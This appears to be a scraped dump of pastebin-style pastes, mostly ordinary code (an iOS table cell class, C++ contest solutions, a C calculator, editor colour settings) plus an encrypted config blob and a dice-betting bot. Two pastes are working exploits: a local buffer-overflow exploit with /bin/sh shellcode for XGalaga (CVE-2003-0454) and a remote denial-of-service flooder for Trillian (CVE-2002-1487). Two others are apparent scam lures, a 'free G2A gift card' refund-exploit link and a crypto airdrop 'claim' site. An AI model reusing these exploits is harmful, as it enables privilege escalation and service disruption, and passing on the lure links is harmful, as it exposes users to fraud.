id,title,username,language,date,content
MNEr6nuB,data831,TestGuy1,JSON,Monday 5th of February 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '79ce92aa85c56a36146dbab6b263fc27f33590690a772abf6b7d7b873f5a6a2ae7788566d2a2d63243584814dd3842ebc3e9bd507e95db65cb90e65891a6293013347780dc690e8b757f071ed928ce98687f4e8d9d0883f9eb6d46f14d325ed969eb0579645ee03ab28950665cfda5e80d52c50b6108515d2320bf5ba8c6ff90',
  otherdata: [
    '93e120bc27185610313e64f6f2af4240',
    'ae201bbe2940cf2fd0fbe0f20f5b55fd',
    '99fde1bc06475b16a2565aadb8a09122',
    '37edd381b1a10474a8a437f8b6039b76',
    '7b93480e759009a1c195679dc17426a3',
    '4ca61e08ce668f29b0722e3115efe8f5',
    '84cc34fa6f416d0fa23f32c375fc5aed',
    '01edca0300308dd7db5b0e96118029ae'
  ]
}"
gEgap75Y,ArtistTVC2.swift,Wolverine_X-Man,Swift,Monday 5th of February 2024 05:59:48 AM CDT,"//
//  ArtistTVC.swift
//  hubble-ios
//
//  Created by Chandan Chandan on 11/06/23.
//

import UIKit

class ArtistTVC: UITableViewCell {
    private lazy var mainBgView: UIView = {
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.backgroundColor = .clear
        view.corner(cornerRadius: 12)
        return view
    }()
    private lazy var bgImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.image = UIImage(named: ""cellbg"")
        imageView.isUserInteractionEnabled = true
        imageView.backgroundColor = .clear
        return imageView
    }()
    private lazy var cellTypeNameLabel: UILabel = {
        let label = UILabel()
        label.text = ""artist_home_artst"".myLocalizedString
        label.textAlignment = .center
        label.isUserInteractionEnabled = true
        label.textColor = .white
        label.backgroundColor = .color111111Alpha6
        label.corner(cornerRadius: 8.0)
        label.font = .fontRegular16
        return label
    }()
    private lazy var cellTypeNameLabelBgView: UIView = {
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.addSubview(cellTypeNameLabel)
        cellTypeNameLabel.snp.makeConstraints { make in
            make.center.equalTo(view)
        }
        return view
    }()
    lazy var bookmarkedImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.tintColor = .white
        imageView.isUserInteractionEnabled = true
        let tap = UITapGestureRecognizer(target: self, action: #selector(saveStarButtonTapped(_:)))
        imageView.addGestureRecognizer(tap)
        return imageView
    }()
    private lazy var detailBgView: UIView = { // details
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.backgroundColor = .color111111Alpha6
        return view
    }()
    private lazy var reatingsStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [ratingsTextlabel, reatingStarImageView])
        reatingStarImageView.snp.makeConstraints { make in
            make.width.equalTo(20)
        }
        stack.isUserInteractionEnabled = true
        stack.axis = .horizontal
        stack.spacing = 2
        stack.distribution = .fill
        stack.alignment = .fill
        return stack
    }()
    private lazy var ratingsTextlabel: UILabel = {
        let label = UILabel()
        label.textColor = .white
        label.isUserInteractionEnabled = true
        label.font = .fontLight14
        return label
    }()

    lazy var nameStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [artistName, artistUserName])
        stack.axis = .vertical
        stack.spacing = 6
        stack.isUserInteractionEnabled = true
        stack.alignment = .fill
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var artistName: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontBold14
        return label
    }()
    private lazy var artistUserName: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontRegular14
        return label
    }()
//    private lazy var priceLocationValueTextStack: UIStackView = {
//        let stack = UIStackView(arrangedSubviews: [priceLocationTextStack, priceLocationValueStack])
//        stack.axis = .horizontal
//        stack.isUserInteractionEnabled = true
//        stack.alignment = .leading
//        stack.distribution = .fillEqually
//        return stack
//    }()
    private lazy var priceTextAndValueStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [priceText, priceValue])
        stack.axis = .vertical
        stack.isUserInteractionEnabled = true
        stack.spacing = 6
        stack.alignment = .fill
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var locationTextAndValueStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [locationText, locationValue])
        stack.axis = .vertical
        locationText.snp.makeConstraints { make in
            make.height.equalTo(10)
        }
        locationValue.snp.makeConstraints { make in
            make.left.equalTo(-2)
        }
        stack.isUserInteractionEnabled = true
        stack.spacing = 6
        stack.alignment = .fill
        stack.distribution = .fill
        return stack
    }()
    private lazy var priceText: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.text = ""artist_home_price"".myLocalizedString
        label.font = .fontRegular14
        return label
    }()
    private lazy var priceValue: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontBold14
        return label
    }()
    private lazy var locationText: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.text = ""artist_home_location"".myLocalizedString
        label.font = .fontRegular14
        return label
    }()
    private lazy var locationValue: UITextView = {
        let label = UITextView()
        label.isUserInteractionEnabled = false
        label.isEditable = false
        label.setPadding(top: .zero, left: .zero, bottom: .zero, right: .zero)
        label.backgroundColor = .clear
        label.textAlignment = .left
        label.font = .fontBold14
        return label
    }()
    private lazy var reatingStarImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.image = .saveStarFill
        imageView.isUserInteractionEnabled = true
        imageView.tintColor = .yellow
        return imageView
    }()
    lazy var cellNextButton: UIButton = {
        let button = UIButton()
        button.isUserInteractionEnabled = true
        button.setImage(.arrowRight, for: .normal)
        button.tintColor = .white
        button.backgroundColor = .colorWhiteAlpha3
        button.corner(cornerRadius: 6.0)
        button.addTarget(self, action: #selector(nextButtonTapped), for: .touchUpInside)
        return button
    }()

    var starButtonHandler: ((_ index: Int) -> Void)?
    var cellNextButtonHandler: (() -> Void)?

    override func awakeFromNib() {
        super.awakeFromNib()
        // Initialization code
    }

    override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {
        super.init(style: style, reuseIdentifier: reuseIdentifier)
        setupUi()
    }

    required init?(coder: NSCoder) {
        fatalError(""init(coder:) has not been implemented"")
    }

    override func setSelected(_ selected: Bool, animated: Bool) {
        super.setSelected(selected, animated: animated)
        // Configure the view for the selected state
    }

    func setupCell(data: HomeArtistModal, index: Int) {
        self.cellTypeNameLabel.text = data.userType
        self.bgImageView.image = .artistBgImage // download image with SD Web Image
        let fullName = data.showLastName ?? true ? ""\(data.firstName  ?? K.emptyString) \(data.lastName ?? K.emptyString)"" : data.firstName ?? K.emptyString
        self.artistName.text = fullName
        self.cellNextButton.accessibilityElement(id: AccessIdentifier.artistHomeTVCNextButton + ""\(index)"", label: AccessLabel.artistHomeTVCNextButton.replaceString(with: fullName))
        self.bookmarkedImageView.image = data.isSaved ?? false ? UIImage.saveStarFill : UIImage.unSaveStar
        self.setAccessibilityOfSaveButton(data: data, index: index)
        self.bookmarkedImageView.tag = index
        self.artistName.accessibilityElement(id: AccessIdentifier.artistHomeTVCName + ""\(index)"", label: AccessLabel.artistHomeTVCName.replaceString(with: fullName ))
        self.artistUserName.text = data.userName
        self.artistUserName.accessibilityElement(id: AccessIdentifier.artistHomeTVCUserName + ""\(index)"", label: AccessLabel.artistHomeTVCUserName.replaceString(with: data.userName ?? K.emptyString))
        self.priceValue.text = ""$\(data.price ?? .zero)""
        self.priceValue.accessibilityElement(id: AccessIdentifier.artistHomeTVCPrice + ""\(index)"", label: AccessLabel.artistHomeTVCPrice.replaceString(with: ""$\(data.price ?? .zero)""))
        self.locationValue.text = ""chandan rahul chandan rahul chandan rahul chandan rahul chandan rahul""
        self.artistUserName.accessibilityElement(id: AccessIdentifier.artistHomeTVCLocation + ""\(index)"", label: AccessLabel.artistHomeTVCLocation.replaceString(with: data.primaryLocation?.address ?? K.emptyString))
        let ratingStar = data.rating ?? 0.0
        if ratingStar < 0.5 {
            self.reatingsStack.isHidden = true
        } else {
            self.ratingsTextlabel.text = String(data.rating ?? .zero)
            self.reatingsStack.isHidden = false
        }
        self.ratingsTextlabel.accessibilityElement(id: AccessIdentifier.artistHomeTVCReating + ""\(index)"", label: AccessLabel.artistHomeTVCReating.replaceString(with: data.rating ?? K.emptyString))
    }

    @objc func nextButtonTapped(_ sender: UIButton) {
        if let block = cellNextButtonHandler {
            block()
        }
    }

    func setAccessibilityOfSaveButton(data: HomeArtistModal, index: Int) {
        if !(data.isSaved ?? false) {
            bookmarkedImageView.accessibilityElement(id: AccessIdentifier.artistHomeTVCSaveButton + ""\(index)"", label: AccessLabel.artistHomeTVCSaveButton.replaceString(with: data.userName ?? K.emptyString))
        } else {
            bookmarkedImageView.accessibilityElement(id: AccessIdentifier.artistHomeTVCUnSaveButton + ""\(index)"", label: AccessLabel.artistHomeTVCUnSaveButton.replaceString(with: data.userName ?? K.emptyString))
        }
    }

    @objc func saveStarButtonTapped(_ tapGestureRecognizer: UITapGestureRecognizer) {
        guard let tappedImage = tapGestureRecognizer.view as? UIImageView else { return }
        if let block = starButtonHandler {
            block(tappedImage.tag)
        }
    }

    lazy var artistProfileImage: UIImageView = {
        let imageView = UIImageView(isImageViewerEnable: true)
        imageView.image = UIImage(named: ""ratingDemoProfile"")
        imageView.corner(cornerRadius: 30)
        imageView.accessibilityElement(id: AccessIdentifier.artistPersonalInfoProfileImage, label: AccessLabel.artistPersonalInfoProfileImage)
        imageView.contentMode = .scaleAspectFill
        return imageView
    }()

    private func setupUi() {
        self.contentView.isUserInteractionEnabled = true
        self.contentView.backgroundColor = .primaryColor
        
        self.contentView.addSubview(mainBgView)
        mainBgView.addSubview(bgImageView)
        bgImageView.addSubview(artistProfileImage)
        detailBgView.addSubview(cellTypeNameLabel)
        detailBgView.addSubview(bookmarkedImageView)
        bgImageView.addSubview(detailBgView)
        bgImageView.addSubview(reatingsStack)
        bgImageView.addSubview(nameStack)
        detailBgView.addSubview(cellNextButton)
        detailBgView.addSubview(priceTextAndValueStack)
        detailBgView.addSubview(locationTextAndValueStack)

        
        mainBgView.snp.makeConstraints { make in
            make.top.equalTo(self.contentView.snp.top)
            make.bottom.equalTo(self.contentView.snp.bottom)
            make.left.equalTo(self.contentView.snp.left)
            make.right.equalTo(self.contentView.snp.right)
        }
        artistProfileImage.snp.makeConstraints { make in
            make.left.equalTo(bgImageView.left).offset(leftOffset)
            make.top.equalTo(bgImageView.top).offset(10)
            make.height.width.equalTo(60)
        }
        bgImageView.snp.makeConstraints { make in
            make.top.bottom.left.right.equalTo(mainBgView)
        }
        bookmarkedImageView.snp.makeConstraints { make in
            make.top.equalTo(bgImageView.snp.top).offset(14)
            make.right.equalTo(bgImageView.snp.right).inset(7)
            make.height.width.equalTo(24)
        }
        cellTypeNameLabel.snp.makeConstraints { make in
            make.right.equalTo(bookmarkedImageView.left).inset(-12)
            make.top.equalTo(bgImageView.snp.top).offset(10)
            make.width.equalTo(78)
            make.height.equalTo(28)
        }
        reatingsStack.snp.makeConstraints { make in
            make.top.equalTo(artistProfileImage.bottom).offset(4)
            make.centerX.equalTo(artistProfileImage)
            make.width.equalTo(44)
            make.height.equalTo(16)
        }
        nameStack.snp.makeConstraints { make in
            make.top.equalTo(reatingsStack.bottom).offset(8)
            make.left.equalTo(artistProfileImage.left)
            make.width.equalTo(96)
        }
        detailBgView.snp.makeConstraints { make in
            make.top.right.bottom.equalTo(bgImageView)
            make.left.equalTo(artistProfileImage.right).offset(32)
        }
        cellNextButton.snp.makeConstraints { make in
            make.height.width.equalTo(32)
            make.right.equalTo(detailBgView.snp.right).inset(10)
            make.centerY.equalTo(detailBgView)
        }
        priceTextAndValueStack.snp.makeConstraints { make in
            make.top.equalTo(detailBgView.top).offset(44)
            make.left.equalTo(detailBgView.left).offset(leftOffset)
            make.height.equalTo(50)
            make.width.equalTo(100)
        }
        locationTextAndValueStack.snp.makeConstraints { make in
            make.top.equalTo(priceTextAndValueStack.bottom).offset(topOffset)
            make.left.equalTo(detailBgView.left).offset(leftOffset)
            make.right.equalTo(detailBgView.right).inset(24)
            make.height.equalTo(52)
        }
    }
}
"
v46EXt4R,02. The Matrix,Spocoman,C++,Monday 5th of February 2024 05:55:16 AM CDT,"#include <iostream>
#include <vector>
#include <cmath>

using namespace std;

bool isPrime(int n) {
    for (int i = 2; i <= sqrt(n); i++) {
        if (n % i == 0) {
            return false;
        }
    }
    return true;
}

int main() {
    int n;
    cin >> n;

    vector<vector<int>> numbers(n, vector<int>(n));

    for (int r = 0; r < n; r++) {
        for (int c = 0; c < n; c++) {
            cin >> numbers[r][c];
        }
    }

    int startCol = 1, finalCol = n - 1, sum = 0;

    for (int r = n - 1; r > n / 2; r--) {
        for (int c = startCol; c < finalCol; c++) {
            if (isPrime(numbers[r][c])) {
                sum += numbers[r][c];
            }
        }
        startCol++;
        finalCol--;
    }

    cout << sum << endl;
    return 0;
}"
7z0GJGSq,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Monday 5th of February 2024 05:36:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_705980.pdf
 
Working as of
05 February 2024"
NnzhBZam,CSV color,OilCastle,JSON,Monday 5th of February 2024 05:27:53 AM CDT,"            {
                ""scope"": ""rainbow1"",
                ""settings"": {
                    ""foreground"": ""#FF0000"",
                    // ""fontStyle"": ""bold"",
                    // ""fontStyle"": ""italic"",
                    // ""fontStyle"": ""underline"",
                    // ""fontStyle"": ""bold italic"",
                    // ""fontStyle"": ""italic underline"",
                    // ""fontStyle"": ""bold underline"",
                    // ""fontStyle"": ""bold italic underline"",
                }
            },
            {
                ""scope"": ""keyword.rainbow2"",
                ""settings"": {
                    ""foreground"": ""#00FF00""
                }
            },
            {
                ""scope"": ""entity.name.function.rainbow3"",
                ""settings"": {
                    ""foreground"": ""#0000FF"",
                }
            },
            {
                ""scope"": ""comment.rainbow4"",
                ""settings"": {
                    ""foreground"": ""#FFFF00"",
                }
            },
            {
                ""scope"": ""string.rainbow5"",
                ""settings"": {
                    ""foreground"": ""#00FFFF"",
                }
            },
            {
                ""scope"": ""variable.parameter.rainbow6"",
                ""settings"": {
                    ""foreground"": ""#FF00FF""
                }
            },
            {
                ""scope"": ""constant.numeric.rainbow7"",
                ""settings"": {
                    ""foreground"": ""#FFA500"",
                }
            },
            {
                ""scope"": ""entity.name.type.rainbow8"",
                ""settings"": {
                    ""foreground"": ""#964B00"",
                }
            },
            {
                ""scope"": ""markup.bold.rainbow9"",
                ""settings"": {
                    ""foreground"": ""#FF007F""
                }
            },
            {
                ""scope"": ""invalid.rainbow10"",
                ""settings"": {
                    ""foreground"": ""#FFFFFF"",
                }
            }
        ]
    },"
411a54JV,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Monday 5th of February 2024 05:07:09 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://claim-netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://claim-netdrop.netlify.app/

651083"
6ttkDR7g,upgrade snowybot 2000,coinwalk,JavaScript,Monday 5th of February 2024 05:02:40 AM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/200).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var nobil = (((Math.floor(original/tens))*tens)-tens);
var mighty = (hectic*blast);
var dager = original;
var wonsy = 0;
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if (bilance>dager){
wonsy = wonsy+1;
dager = parseFloat(bilance);
}
if (bilance<dager){
dager = parseFloat(bilance);
}
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)&&(bilance<bob)&&(bilance>nobil)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
     nobil = parseFloat(bilance);
} 
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)&&(bilance>bob)&&(bilance>nobil)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    mighty = (hectic*blast);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
    nobil = (((Math.floor(bilance/tens))*tens)-tens);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
if ((wonsy>=3)&&(wonsy<=6)){
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_hi').click();
}
if (wonsy<=2){
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
}
if (wonsy>=7){
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
wonsy = 0
}
setTimeout(() => dobet(), 1000);
} 
dobet();
"
6VJ8Pgap,Calculadora com polimorfismo em tempo de execução em C++,jacknpoe,C,Monday 5th of February 2024 05:00:16 AM CDT,"#include <stdio.h>
#include <locale.h>

double soma(double num1, double num2) { return num1 + num2; }
double subtracao(double num1, double num2) { return num1 - num2; }
double multiplicacao(double num1, double num2) { return num1 * num2; }
double divisao(double num1, double num2) { return num1 / num2; }

int main() {
	double numero1, numero2;
	int operacaoSelecionada;

	double (*operacoes[4]) (double num1, double num2);
	operacoes[0] = soma;
	operacoes[1] = subtracao;
	operacoes[2] = multiplicacao;
	operacoes[3] = divisao;
	
	setlocale( LC_ALL, """");		// caracteres acentuados

	printf(""Escolha uma operação: 0: adição, 1: subtração, 2: multiplicação, 3: divisão: "");
	scanf(""%i"", &operacaoSelecionada);
	if(operacaoSelecionada < 0 || operacaoSelecionada > 3) {
		printf(""Operação incorreta!\n"");
		return -1;
	}

	printf(""Número 1: "");
	scanf(""%lf"", &numero1);

	printf(""Número 2: "");
	scanf(""%lf"", &numero2);
	
	printf(""Resultado: %f\n"", (*operacoes[operacaoSelecionada])(numero1, numero2));
}"
Sk0qSn7Z,Untitled,ekzolot,C++,Monday 5th of February 2024 04:58:05 AM CDT,"#include <bits/stdc++.h>
#define int long long
using namespace std;
vector<int> powers(int p, int n, int mod){
    vector<int> q(n+1);
    q[0]=1;
    for (int i=1; i<=n; i++){
        q[i]=q[i-1]*p;
        q[i]%=mod;
    }
    return q;
}

vector<int> hash_function(int p, int mod, string s){
    int n = (int) s.size();
    vector<int> h(n+1);
    for (int i=1; i<=n; i++){
        h[i]=h[i-1]*p+s[i-1];
        h[i]%=mod;
    }
    return h;
}
int hash_func(int mod, vector<int>& h, vector<int>& q, int l, int r){
    int x=h[r]-h[l]*q[r-l];
    x=((x%mod)+mod)%mod;
    return x;
}
int res(int mod, vector<int>& q, string s, int result, int i, char x){
    int n=(int) s.size();
    int cur=result;
    cur-=s[i]*q[n-1-i];
    cur+=x*q[n-1-i];
    cur=(cur%mod+mod)%mod;
    return cur;
}
signed main(){
    int mod1=1000000007;
    int mod2=1000000009;
    int p=228;
    string s, t;
    cin>>s>>t;
    int n=(int) s.size();
    int m=(int) t.size();
    vector<int> q1=powers(p, m, mod1);
    vector<int> q2=powers(p, m, mod2);
    vector<int> h1= hash_function(p, mod1, t);
    vector<int> h2= hash_function(p, mod2, t);
    unordered_set<int> pos1;
    unordered_set<int> pos2;
    int result1=0;
    int result2=0;
    for (int i=0; i<n; i++){
        result1+=s[i]*q1[n-1-i];
        result2+=s[i]*q2[n-1-i];
        result1%=mod1;
        result2%=mod2;
    }
    pos1.insert(result1);
    pos2.insert(result2);
    for (int i=0; i<n; i++){
        for (char x='A'; x<='Z'; x++){
            pos1.insert(res(mod1, q1, s, result1, i, x));
            pos2.insert(res(mod2, q2, s, result2, i, x));
        }
        for (char x='a'; x<='z'; x++){
            pos1.insert(res(mod1, q1, s, result1, i, x));
            pos2.insert(res(mod2, q2, s, result2, i, x));
        }
    }
    vector<int> ans;
    for (int i=0; i<=m-n; i++){
        if (pos1.count(hash_func(mod1, h1, q1, i, i+n)) && pos2.count(hash_func(mod2, h2, q2, i, i+n))){
            ans.push_back(i+1);
        }
    }
    cout<<ans.size()<<""\n"";
    for (int x:ans){
        cout<<x<<"" "";
    }
    return 0;
}"
nSnkwv0b,MegaTun,SilverProKingM,JSON,Monday 5th of February 2024 04:06:12 AM CDT,qXViTxXMMa3uWDKbQPtvO07URATgpHKuQOdTwivKtiP4ivDTVaJGcIKDpKWoCPzDWqN53vfAvSw6Mj2Qmqa9IV/eT7a45E70HZnqlqmRsT/8Pg9dWqjFkQE7oHknyJoWy+zcHLA74/wiHC7+88JDA32DU8iqGL96mnbuuuwFAhqh3akxDgZSbW6R9xq4boQIn1xtxQcqCOD69NSLKJ3wklzL2s/j2Xz9yo4MC7hEiwWgmBcHMbR8r3+WJmb2MnwzsakgvmxOlmqiG9SRnoZirCJphdJLahtN7+SCGMFOSsp91uGlmxLuAAqLHPhSWQ4llvWnAmKRC2XlcmpoPV5vC10CUKCYyFbIn8/mLBXBaW7CzCFifobjeZ3vmM6qDb8axL2oAVodj5O3BdrOfZnX8I+xMIZZ8yIheQQncYRKjyg7HVYl8wYFGXHRZtNN7UYfToecHVYtFNC6Qw23SwHzW+QPDrO3bnG/HcgGAhL213am3n/j6T7pHAiSCJzTvQo9ZuXLxwM5B+SFsXNzdcYy724dAFbVHN0JF5T3GTpA2diInZyOKWFDuCq1b5Vlj8EHfq+CHKO2fr7steNrLM6AuskHrhtb5kVbjU09f6sx8h4YfyDS1tIrdEpd+4U5z8XjqTCixRaUKyHmMQlVXs3kJTQqLKD+8+04UfavFy0ckdyXGuiWuTQV1tRH2Uru20LX1q13qpYXIYwwCqkLYnyATzajDL4G/AM2bxkNPGF3+ILD1Ex2EGCOzvA/S/FNR4kCPAbQOoUy9XUopQdkvUGRmK3RJrPpGLqY9CBkYO69YbprQuCxiXn/YQYVrSO0/TGCOfEu6nZ7HxRFDW6ykb/i1zS0nLthcJi2yPZ5eLsb79ulVMOQ0PMgTA9N6LK9ecjBt61nYr+Z0iiSNb4A1ZtsBauS0f9Yz02gXaQE67BX559upluPI4p/QPTEKOyP0aHjFpJNj6vrM+VhS2+zY8mE9iYSKdmokjnxkt69J1z9lOhvDF28pXNt3rf22NNCGwyFWNZE82zL0TBsfa2Oxrja0lLJcd1c8RUktM6ImLclUaUrSwzIwK5aI3vX2jBkQJcpofru9G4NGHnJV8hyac+JU+AzvA0iQX7U6ABV7Nh/qiKEpObK7IJkO0iSgUtF+DxJR/nbzXjXeIZE/qfA9qIRMQQZRrX54zB1Sc20wuCq4mElTPTwuuVKi91w7ZIR2tbTLWGzyw==
GeLjSDNv,XGalaga 2.0.34 (RedHat 9.0) - Local Game - CVE-2003-0454,FlyFar,C,Monday 5th of February 2024 03:50:04 AM CDT,"/* 0x333xgalaga => XGalaga 2.0.34 local game exploit (Red Hat 9.0)
*
* tested against xgalaga-2.0.34-1.i386.rpm
* under Red Hat Linux 9.0
*
* - bug found by Steve Kemp
* - exploit coded by c0wboy @ 0x333
*
* (c) 0x333 Outsider Security Labs / www.0x333.org
*
*/


#include <stdio.h>
#include <string.h>
#include <unistd.h>


#define BIN ""/usr/X11R6/bin/xgalaga""
#define SIZE 264

#define RET 0xbffffe2c /* tested against Red Hat Linux 9.0 */
#define NOP 0x90


unsigned char shellcode[] =

/* setregid (20,20) shellcode */
""\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47""
""\xcd\x80""

/* exec /bin/sh shellcode */

""\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62""
""\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"";


void banner (void);
void memret (char *, int, int, int);


void banner (void)
{
fprintf (stdout, ""\n\n --- xgalaga local GAME exploit by c0wboy ---\n"");
fprintf (stdout, "" --- Outsiders Se(c)urity Labs / www.0x333.org ---\n\n"");
}


void memret (char *buffer, int ret, int size, int align)
{
int i;
int * ptr = (int *) (buffer + align);

for (i=0; i<size; i+=4)
*ptr++ = ret;

ptr = 0x0;
}


int main ()
{
int ret = RET;
char out[SIZE];

memret ((char *)out, ret, SIZE-1, 0);

memset ((char *)out, NOP, 33);
memcpy ((char *)out+33, shellcode, strlen(shellcode));

setenv (""HOME"", out, 1);

banner ();
execl (BIN, BIN, ""-scores"", 0x0); // the switch ""-scores"" is necessary to exploit the game
}

// milw0rm.com [2003-07-31]
            "
kVdVFASw,Trillian 0.74 - Remote Denial of Service - CVE-2002-1487,FlyFar,C,Monday 5th of February 2024 03:26:24 AM CDT,"/*

[--------------------------------------------]
[:::::::::::::::::: trillian 0.7*(d patch)   ]
[:::::Denial:of:Service::simple:exploit::]
[-----------------------------[l0bstah]-----]
[usage ::                                           ]
[      : trillah name attacked-nick          ]
[                                                       ]
[comment:: after patch .74d, exploits,  ]
[         wich use damage (~4095 data)  ]
[         not work, but this exploit           ]
[         work at any patch.                    ]
[                                                       ]
[P.S. irc specification include rull:          ]
[510 characters maximum allowed for   ]
[the command and its parameters...     ]
[that is why szBuf has 570 length...       ]
[--------------------------------------------]

*/

 #include <winsock.h>
 #include <iostream.h>
 #include <stdio.h>
 #include <dos.h>

 #define port    4384
 #define bfsize  540
 #define rptimes 1000

 WSADATA     wsadata;
 SOCKADDR_IN sa;
 SOCKET      s;
 LPHOSTENT   lpHostEntry;
 int         SockAddr = sizeof(struct sockaddr);
 int         i, ports;
 char        szBuf[570];          // [damage data] 
 char        nick[50];            // <NICK> command 
 char        user[50];            // <USER> command 
 char        mode[50];            // <MODE> command 
 char        *cname = ""trillah"";  // your client name


int main(int argc, char **argv)
 {

   printf(""::::::::::::::::::::::::::::::::::::\n"");
   printf("": trillah - remote DoS exploit :::::\n"");
   printf("":::::::::::::::::::::::::::[l0bstah]\n"");

   if (argc < 3) 
   { printf(""use: trillah dnsname nick\n""); return 0; }
   
   char *addr=argv[1];
   ports=port;

   if (WSAStartup(0x0101,&wsadata) == 0)
   {

        lpHostEntry = gethostbyname(addr);

        sa.sin_family = AF_INET;
        sa.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
        sa.sin_port = htons(ports);

        if ((s=socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET)
        {
        printf(""Can't open socket! - #%d\n"",WSAGetLastError());
        exit(0);
        }

        printf(""connecting to irc server : %s...\n"", addr);

        if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) == -1)
        {
        printf(""Can't connect() - #%d\n"",WSAGetLastError());
        exit(0);
        }       
        printf(""connected... starting login session \n\n"");

        //*** NICK <NICK>
        strcpy(nick, ""NICK "");
        strcat(nick, cname);
        strcat(nick, ""\n"");
        send(s,
                nick,
                strlen(nick),
                0);

        printf(nick);

        //*** USER <mode> <unused> <realname>
        strcpy(user, ""USER "");
        strcat(user, cname);
        strcat(user, "" 0 127.0.0.1 : trilla\n"");
        send(s,
                user,
                strlen(user),
                0);

        printf(user);

        sleep(1);

        //*** MODE <nick> (+|-*)
        strcpy(mode, ""MODE "");
        strcat(mode, cname);
        strcat(mode, "" +i\n"");
        send(s,
                mode,
                strlen(mode),
                0);

        sleep(2);

        //**********DAMAGE****DATA*************//

        printf(""Sending damage data...\n"");
        strcat(szBuf, ""NOTICE "");
        strcat(szBuf, argv[2]);
        strcat(szBuf, "" :"");
        for(i=0;i<=bfsize;i++) strcat(szBuf,""A"");
        strcat(szBuf, ""\n"");


        for (i=0;i<=rptimes;i++)
        {

        send(s,
            szBuf,
            strlen(szBuf),
            0);
        }


        printf(""attack complete...."");

        //*************************************//

        closesocket(s);
        
        }

  WSACleanup();

}

// milw0rm.com [2003-08-01]
            "
Vd6zmsSn,ArtistTVC.swift,Wolverine_X-Man,Swift,Monday 5th of February 2024 03:18:14 AM CDT,"//
//  ArtistTVC.swift
//  hubble-ios
//
//  Created by Chandan Chandan on 11/06/23.
//

import UIKit

class ArtistTVC: UITableViewCell {
    private lazy var mainBgView: UIView = {
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.backgroundColor = .clear
        view.corner(cornerRadius: 12)
        return view
    }()
    private lazy var bgImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.image = UIImage(named: ""cellbg"")
        imageView.isUserInteractionEnabled = true
        imageView.backgroundColor = .clear
        return imageView
    }()
    private lazy var cellTypeNameLabel: UILabel = {
        let label = UILabel()
        label.text = ""artist_home_artst"".myLocalizedString
        label.textAlignment = .center
